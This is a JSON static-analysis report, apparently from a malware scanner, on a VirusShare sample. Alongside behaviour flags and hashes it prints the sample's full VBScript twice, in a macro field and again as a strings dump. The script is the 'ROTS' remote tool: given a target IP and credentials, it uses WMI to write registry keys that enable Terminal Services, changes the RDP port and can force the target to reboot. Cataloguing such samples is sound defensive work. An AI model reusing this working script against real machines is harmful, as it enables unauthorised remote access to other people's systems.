{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Open": "May open a file",
            "Run": "May run an executable file or a system command",
            "SYSTEM": "May run an executable file or a system command on a Mac",
            "Windows": "May enumerate application windows",
            "chr": "May attempt to obfuscate specific str",
            "createObject": "May create an OLE object",
            "shell": "May run an executable file or a system command",
            "write": "May write to a file",
            "wscript.shell": "May run an executable file or a system command"
        },
        "macro": "on error resume next\nset outstreem=wscript.stdout\nset instreem=wscript.stdin\nif (lcase(right(wscript.fullname,11))=\"wscript.exe\") then\n   set objShell=wscript.createObject(\"wscript.shell\")\n   objShell.Run(\"cmd.exe /k cscript //nologo \"&chr(34)&wscript.scriptfullname&chr(34))\n   wscript.quit\nend if\nif wscript.arguments.count<3 then\n   usage()\n   wscript.echo \"Not enough parameters.\"\n   wscript.quit\nend if\n\nipaddress=wscript.arguments(0)\nusername=wscript.arguments(1)\npassword=wscript.arguments(2)\nif wscript.arguments.count>3 then\n   port=wscript.arguments(3)\nelse\n   port=3389\nend if\nif not isnumeric(port) or port<1 or port>65000 then\n   wscript.echo \"The number of port is error.\"\n   wscript.quit\nend if\nif wscript.arguments.count>4 then\n   reboot=wscript.arguments(4)\nelse\n   reboot=\"\"\nend if\n\nusage()\noutstreem.write \"Conneting \"&ipaddress&\" ....\"\nset objlocator=createobject(\"wbemscripting.swbemlocator\")\nset objswbemservices=objlocator.connectserver(ipaddress,\"root/cimv2\",username,password)\nobjswbemservices.security_.privileges.add 23,true\nobjswbemservices.security_.privileges.add 18,true\nshowerror(err.number)\n\noutstreem.write \"Checking OS type....\"\nset colinstoscaption=objswbemservices.execquery(\"select caption from win32_operatingsystem\")\nfor each objinstoscaption in colinstoscaption\n   if instr(objinstoscaption.caption,\"Server\")>0 then\n      wscript.echo \"OK!\"\n   else\n      wscript.echo \"OS type is \"&objinstoscaption.caption\n      outstreem.write \"Do you want to cancel setup?[y/n]\"\n      strcancel=instreem.read\n      if lcase(strcancel)<>\"n\" then wscript.quit\n   end if\nnext\n\noutstreem.write \"Writing into registry ....\"\nset objinstreg=objlocator.connectserver(ipaddress,\"root/default\",username,password).get(\"stdregprov\")\nHKLM=&h80000002\nwith objinstreg\n.createkey ,\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\netcache\"\n.setdwordvalue HKLM,\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\netcache\",\"Enabled\",0\n.createkey HKLM,\"SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\"\n.setdwordvalue HKLM,\"SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\",\"EnableAdminTSRemote\",1\n.setdwordvalue HKLM,\"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\",\"TSEnabled\",1\n.setdwordvalue HKLM,\"SYSTEM\\CurrentControlSet\\Services\\TermDD\",\"Start\",2\n.setdwordvalue HKLM,\"SYSTEM\\CurrentControlSet\\Services\\TermService\",\"Start\",2\n.setstringvalue HKLM,\".DEFAULT\\Keyboard Layout\\Toggle\",\"Hotkey\",\"1\"\n.setdwordvalue HKLM,\"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\",\"PortNumber\",port\nend with\nshowerror(err.number)\n\nrebt=lcase(reboot)\nif rebt=\"/r\" or rebt=\"-r\" or rebt=\"\\r\" then\n   outstreem.write \"Now, reboot target....\"\n   strwqlquery=\"select * from win32_operatingsystem where primary='true'\"\n   set colinstances=objswbemservices.execquery(strwqlquery)\n   for each objinstance in colinstances\n      objinstance.win32shutdown(6)\n   next\n   showerror(err.number)\nelse\n   wscript.echo \"You need to reboot target.\"&vbcrlf&\"Then,\"\nend if\nwscript.echo \"You can logon terminal services on \"&port&\" later. Good luck!\"\n\nfunction showerror(errornumber)\nif errornumber Then\n   wscript.echo \"Error 0x\"&cstr(hex(err.number))&\" .\"\n   if err.description <> \"\" then\n      wscript.echo \"Error description: \"&err.description&\".\"\n   end if\n   wscript.quit\nelse\n   wscript.echo \"OK!\"\nend if\nend function\n\nfunction usage()\nwscript.echo string(79,\"*\")\nwscript.echo \"ROTS v1.01\"\nwscript.echo \"Remote Open Terminal services Script, by zzzEVAzzz\"\nwscript.echo \"Welcome to visite www.isgrey.com\"\nwscript.echo \"Usage:\"\nwscript.echo \"cscript \"&wscript.scriptfullname&\" targetIP username password [port] [/r]\"\nwscript.echo \"port: default number is 3389.\"\nwscript.echo \"/r: auto reboot target.\"\nwscript.echo string(79,\"*\")&vbcrlf\nend function"
    },
    "filename": "VirusShare_07df894e18ece99c5e64c9e3068a07d0",
    "filesize": 3836,
    "filetype": "ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "07df894e18ece99c5e64c9e3068a07d0",
        "sha1": "f61c71192861b66f0e9f0acdc114682083707e3c",
        "sha256": "b8a83cb6bfa8228f503c38bda879e8902bd2959d2469b7d15fe06c9bebd1e146"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "on error resume next",
            "set outstreem=wscript.stdout",
            "set instreem=wscript.stdin",
            "if (lcase(right(wscript.fullname,11))=\"wscript.exe\") then",
            "   set objShell=wscript.createObject(\"wscript.shell\")",
            "   objShell.Run(\"cmd.exe /k cscript //nologo \"&chr(34)&wscript.scriptfullname&chr(34))",
            "   wscript.quit",
            "end if",
            "if wscript.arguments.count<3 then",
            "   usage()",
            "   wscript.echo \"Not enough parameters.\"",
            "   wscript.quit",
            "end if",
            "ipaddress=wscript.arguments(0)",
            "username=wscript.arguments(1)",
            "password=wscript.arguments(2)",
            "if wscript.arguments.count>3 then",
            "   port=wscript.arguments(3)",
            "else",
            "   port=3389",
            "end if",
            "if not isnumeric(port) or port<1 or port>65000 then",
            "   wscript.echo \"The number of port is error.\"",
            "   wscript.quit",
            "end if",
            "if wscript.arguments.count>4 then",
            "   reboot=wscript.arguments(4)",
            "else",
            "   reboot=\"\"",
            "end if",
            "usage()",
            "outstreem.write \"Conneting \"&ipaddress&\" ....\"",
            "set objlocator=createobject(\"wbemscripting.swbemlocator\")",
            "set objswbemservices=objlocator.connectserver(ipaddress,\"root/cimv2\",username,password)",
            "objswbemservices.security_.privileges.add 23,true",
            "objswbemservices.security_.privileges.add 18,true",
            "showerror(err.number)",
            "outstreem.write \"Checking OS type....\"",
            "set colinstoscaption=objswbemservices.execquery(\"select caption from win32_operatingsystem\")",
            "for each objinstoscaption in colinstoscaption",
            "   if instr(objinstoscaption.caption,\"Server\")>0 then",
            "      wscript.echo \"OK!\"",
            "   else",
            "      wscript.echo \"OS type is \"&objinstoscaption.caption",
            "      outstreem.write \"Do you want to cancel setup?[y/n]\"",
            "      strcancel=instreem.read",
            "      if lcase(strcancel)<>\"n\" then wscript.quit",
            "   end if",
            "next",
            "outstreem.write \"Writing into registry ....\"",
            "set objinstreg=objlocator.connectserver(ipaddress,\"root/default\",username,password).get(\"stdregprov\")",
            "HKLM=&h80000002",
            "with objinstreg",
            ".createkey ,\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\netcache\"",
            ".setdwordvalue HKLM,\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\netcache\",\"Enabled\",0",
            ".createkey HKLM,\"SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\"",
            ".setdwordvalue HKLM,\"SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\",\"EnableAdminTSRemote\",1",
            ".setdwordvalue HKLM,\"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\",\"TSEnabled\",1",
            ".setdwordvalue HKLM,\"SYSTEM\\CurrentControlSet\\Services\\TermDD\",\"Start\",2",
            ".setdwordvalue HKLM,\"SYSTEM\\CurrentControlSet\\Services\\TermService\",\"Start\",2",
            ".setstringvalue HKLM,\".DEFAULT\\Keyboard Layout\\Toggle\",\"Hotkey\",\"1\"",
            ".setdwordvalue HKLM,\"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\",\"PortNumber\",port",
            "end with",
            "showerror(err.number)",
            "rebt=lcase(reboot)",
            "if rebt=\"/r\" or rebt=\"-r\" or rebt=\"\\r\" then",
            "   outstreem.write \"Now, reboot target....\"",
            "   strwqlquery=\"select * from win32_operatingsystem where primary='true'\"",
            "   set colinstances=objswbemservices.execquery(strwqlquery)",
            "   for each objinstance in colinstances",
            "      objinstance.win32shutdown(6)",
            "   next",
            "   showerror(err.number)",
            "else",
            "   wscript.echo \"You need to reboot target.\"&vbcrlf&\"Then,\"",
            "end if",
            "wscript.echo \"You can logon terminal services on \"&port&\" later. Good luck!\"",
            "function showerror(errornumber)",
            "if errornumber Then",
            "   wscript.echo \"Error 0x\"&cstr(hex(err.number))&\" .\"",
            "   if err.description <> \"\" then",
            "      wscript.echo \"Error description: \"&err.description&\".\"",
            "   end if",
            "   wscript.quit",
            "else",
            "   wscript.echo \"OK!\"",
            "end if",
            "end function",
            "function usage()",
            "wscript.echo string(79,\"*\")",
            "wscript.echo \"ROTS v1.01\"",
            "wscript.echo \"Remote Open Terminal services Script, by zzzEVAzzz\"",
            "wscript.echo \"Welcome to visite www.isgrey.com\"",
            "wscript.echo \"Usage:\"",
            "wscript.echo \"cscript \"&wscript.scriptfullname&\" targetIP username password [port] [/r]\"",
            "wscript.echo \"port: default number is 3389.\"",
            "wscript.echo \"/r: auto reboot target.\"",
            "wscript.echo string(79,\"*\")&vbcrlf",
            "end function"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.294609",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
